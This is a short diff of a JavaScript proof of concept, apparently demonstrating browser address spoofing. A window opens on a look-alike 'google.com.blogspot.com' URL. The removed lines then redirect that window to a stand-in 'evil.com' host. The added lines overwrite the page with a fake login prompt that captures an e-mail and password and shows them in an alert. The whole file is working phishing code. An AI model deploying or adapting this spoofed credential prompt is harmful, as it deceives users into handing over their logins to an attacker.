@@ -1,9 +1,7 @@
-
 <script>
-    window.onclick = () => {
-        w = window.open("https://google.com.blogspot.com/?q=www.facebook.com")
-        setTimeout(() => {
-            t = w.location.replace('ssh://evil.com');
-        }, 1000)
-    }
+function go(){
+var x=window.open('https://www.google.com.blogspot.com/?q=www.facebook.com');
+setTimeout(function(){x.document.body.innerHTML='<h1>Please login</h1>';a=x.prompt('E-mail','');b=x.prompt('Password','');alert('E-mail: '+a+'\nPassword: '+b)},3000);
+}
 </script>
+<button onclick="go()">go</button>
